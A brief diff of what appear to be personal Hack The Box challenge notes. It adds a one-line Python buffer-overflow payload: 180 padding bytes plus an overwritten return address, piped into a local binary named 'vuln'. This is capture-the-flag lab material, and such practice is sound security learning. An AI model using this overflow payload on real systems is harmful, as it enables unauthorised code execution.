@@ -59,6 +59,9 @@ I am confused !!!
 The buffer local_bc is 180 long 
 
 
+python -c "print 'A' * 180 + '\xe6\x91\x04\x08'" | ~/Documents/HTB/challenges/vuln
+
+
 
 ## NMap
 
